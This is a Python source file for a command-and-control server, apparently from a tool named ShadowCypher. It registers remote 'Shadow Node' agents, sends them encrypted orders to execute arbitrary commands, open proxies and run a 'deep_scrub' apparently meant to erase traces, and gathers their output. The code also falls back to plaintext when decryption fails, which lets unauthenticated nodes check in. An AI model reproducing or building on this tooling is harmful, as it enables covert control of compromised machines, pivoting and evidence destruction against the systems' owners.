"""
ShadowCypher Ghost Orchestrator — Manages remote 'Shadow Nodes' (Ghost Agents).
Provides secure command delegation and asynchronous result aggregation.
"""

import socket
import subprocess
import threading
import json
import time
import base64
import ssl
import os
from typing import Dict, List, Optional
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from shadowcypher.core.logger import logger
from shadowcypher.core.bus import bus
from shadowcypher.core.config import config

_MASTER_KEY_PATHS = (
    "/etc/shadowcypher/master.key",
    os.path.join(str(config.project_root), "configs", "security", "master.key"),
)
_KEY_CACHE: Optional[bytes] = None


def _load_shared_key() -> bytes:
    """Load the per-install AES-GCM key. Refuses to fall back to a hardcoded default.

    Resolution order:
      1. SHADOWCYPHER_GHOST_KEY env var (32 raw bytes hex-encoded)
      2. /etc/shadowcypher/master.key (mode 600, 32 raw bytes)
      3. <project>/configs/security/master.key (dev fallback, mode 600)
    """
    global _KEY_CACHE
    if _KEY_CACHE is not None:
        return _KEY_CACHE

    env_key = os.environ.get("SHADOWCYPHER_GHOST_KEY")
    if env_key:
        try:
            raw = bytes.fromhex(env_key)
        except ValueError:
            raw = env_key.encode()
        if len(raw) != 32:
            raise RuntimeError("SHADOWCYPHER_GHOST_KEY must decode to exactly 32 bytes.")
        _KEY_CACHE = raw
        return _KEY_CACHE

    for path in _MASTER_KEY_PATHS:
        if os.path.exists(path):
            with open(path, "rb") as f:
                raw = f.read().strip()
            if len(raw) != 32:
                raise RuntimeError(f"GHOST_KEY at {path} is {len(raw)} bytes; expected 32.")
            _KEY_CACHE = raw
            return _KEY_CACHE

    raise RuntimeError(
        "GHOST_KEY_MISSING: no per-install master key found. "
        "Set SHADOWCYPHER_GHOST_KEY env var or write 32 raw bytes to /etc/shadowcypher/master.key (mode 600). "
        "Refusing to encrypt with a hardcoded default key."
    )


def encrypt(data: str) -> str:
    aesgcm = AESGCM(_load_shared_key())
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(data: str) -> str:
    try:
        data = data.strip()
        logger.debug("ghost", f"DECRYPT_ATTEMPT: len={len(data)} data={data[:32]}...")
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        raw = base64.b64decode(data)
        if len(raw) < 13: return ""
        nonce, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(_load_shared_key())
        decrypted = aesgcm.decrypt(nonce, ct, None).decode()
        # Remove padding
        if "|" in decrypted:
            return decrypted.split("|")[0]
        return decrypted
    except Exception as e:
        logger.debug("ghost", f"DECRYPT_FAIL: {type(e).__name__}: {e}")
        return ""

class ShadowNode:
    def __init__(self, nick: str, fp: str, os_info: str, host: str, conn: socket.socket):
        self.nick = nick
        self.fp = fp
        self.os = os_info
        self.host = host
        self.conn = conn
        self.last_seen = time.time()
        self.is_active = True

class GhostOrchestrator:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super(GhostOrchestrator, cls).__new__(cls)
            cls._instance.nodes = {}
            cls._instance.server_socket = None
            cls._instance.running = False
        return cls._instance

    def start(self, port: int = 44444):
        if self.running: return
        self.running = True
        self.port = port
        threading.Thread(target=self._server_loop, daemon=True).start()
        logger.info("ghost", f"GHOST_ORCHESTRATOR: Listening for Shadow Nodes on port {port}")

    def _server_loop(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # TLS wrapping. Per-install cert dir, no shell exec, neutral subject.
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert_dir = os.environ.get("SHADOWCYPHER_GHOST_CERT_DIR", os.path.expanduser("~/.shadowcypher/ghost"))
        cert_file = os.path.join(cert_dir, "cert.pem")
        key_file = os.path.join(cert_dir, "key.pem")
        if not (os.path.exists(cert_file) and os.path.exists(key_file)):
            logger.warn("ghost", f"GHOST_SSL: generating ephemeral cert in {cert_dir}")
            os.makedirs(cert_dir, mode=0o700, exist_ok=True)
            try:
                subprocess.run(
                    [
                        "openssl", "req", "-x509",
                        "-newkey", "rsa:4096",
                        "-keyout", key_file,
                        "-out", cert_file,
                        "-days", "365",
                        "-nodes",
                        "-subj", "/CN=shadowcypher.local",
                    ],
                    check=True, capture_output=True, timeout=60,
                )
                os.chmod(key_file, 0o600)
                os.chmod(cert_file, 0o644)
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as e:
                logger.error("ghost", f"GHOST_SSL_GENFAIL: cannot generate cert: {e}")
                self.running = False
                return
        context.load_cert_chain(certfile=cert_file, keyfile=key_file)

        # Default-bind loopback; require explicit env opt-in for external listeners.
        bind_host = os.environ.get("SHADOWCYPHER_GHOST_BIND", "127.0.0.1")
        try:
            self.server_socket.bind((bind_host, self.port))
            self.server_socket.listen(10)
        except Exception as e:
            logger.error("ghost", f"GHOST_FATAL: Could not bind port {self.port}: {e}")
            self.running = False
            return

        while self.running:
            try:
                raw_conn, addr = self.server_socket.accept()
                try:
                    conn = context.wrap_socket(raw_conn, server_side=True)
                    threading.Thread(target=self._handle_node, args=(conn, addr), daemon=True).start()
                except Exception as e:
                    logger.debug("ghost", f"TLS_HANDSHAKE_FAIL: {addr[0]} ({e})")
                    raw_conn.close()
            except Exception:
                break

    def _handle_node(self, conn, addr):
        node_id = None
        try:
            # 1. Initial Handshake
            data = conn.recv(4096).decode()
            if not data: return
            
            # Attempt to decrypt
            decrypted = decrypt(data.strip())
            if not decrypted:
                # Fallback to plaintext for migration/test
                decrypted = data
                
            packet = json.loads(decrypted)
            if packet.get("type") != "ghost_checkin":
                conn.close()
                return

            nick = packet.get("nick")
            fp = packet.get("fp")
            os_info = packet.get("os")
            host = packet.get("host")
            
            node_id = fp
            node = ShadowNode(nick, fp, os_info, host, conn)
            self.nodes[node_id] = node
            
            logger.info("ghost", f"SHADOW_NODE_LINKED: {nick} ({addr[0]}) [{os_info}]")
            bus.publish("ghost_node_linked", {"nick": nick, "fp": fp, "host": addr[0]})

            # 2. Keep-alive / Command Receiver loop
            while node.is_active:
                conn.settimeout(30.0)
                resp_data = conn.recv(16384).decode()
                if not resp_data: break
                
                # Handle possible multiple JSON objects in one buffer (newline delimited)
                for line in resp_data.split('\n'):
                    if not line.strip(): continue
                    logger.debug("ghost", f"RAW_RECV: {line[:50]}...")
                    try:
                        # Attempt to decrypt if it looks like base64
                        decrypted = decrypt(line)
                        if decrypted:
                            resp_packet = json.loads(decrypted)
                        else:
                            resp_packet = json.loads(line)
                            
                        if resp_packet.get("type") == "ghost_output":
                            bus.publish("ghost_node_output", {
                                "fp": fp,
                                "nick": nick,
                                "output": resp_packet.get("output")
                            })
                    except Exception:
                        continue
                node.last_seen = time.time()
                
        except Exception as e:
            if node_id and node_id in self.nodes:
                logger.warn("ghost", f"SHADOW_NODE_DROPPED: {self.nodes[node_id].nick} ({e})")
            else:
                logger.debug("ghost", f"GHOST_LINK_FAIL: {addr[0]} ({e})")
        finally:
            if node_id and node_id in self.nodes:
                self.nodes[node_id].is_active = False
                del self.nodes[node_id]
            conn.close()

    def execute(self, node_fp: str, command: str):
        node = self.nodes.get(node_fp)
        if not node or not node.is_active:
            return False
        
        payload = {
            "type": "execute",
            "cmd": command
        }
        try:
            encrypted_payload = encrypt(json.dumps(payload))
            logger.debug("ghost", f"SENDING_CMD: {command} (Encrypted: {len(encrypted_payload)} bytes)")
            node.conn.sendall((encrypted_payload + "\n").encode())
            return True
        except Exception:
            node.is_active = False
            return False

    def start_proxy(self, node_fp: str, port: int):
        node = self.nodes.get(node_fp)
        if not node or not node.is_active:
            return False
        
        payload = {
            "type": "proxy",
            "port": port
        }
        try:
            encrypted_payload = encrypt(json.dumps(payload))
            node.conn.sendall((encrypted_payload + "\n").encode())
            return True
        except Exception:
            node.is_active = False
            return False

    def deep_scrub(self, node_fp: str):
        node = self.nodes.get(node_fp)
        if not node or not node.is_active:
            return False
        
        payload = {
            "type": "scrub"
        }
        try:
            encrypted_payload = encrypt(json.dumps(payload))
            node.conn.sendall((encrypted_payload + "\n").encode())
            return True
        except Exception:
            node.is_active = False
            return False

    def get_active_nodes(self) -> List[dict]:
        return [
            {"nick": n.nick, "fp": n.fp, "os": n.os, "host": n.host, "last_seen": n.last_seen}
            for n in self.nodes.values() if n.is_active
        ]

ghost_orchestrator = GhostOrchestrator()
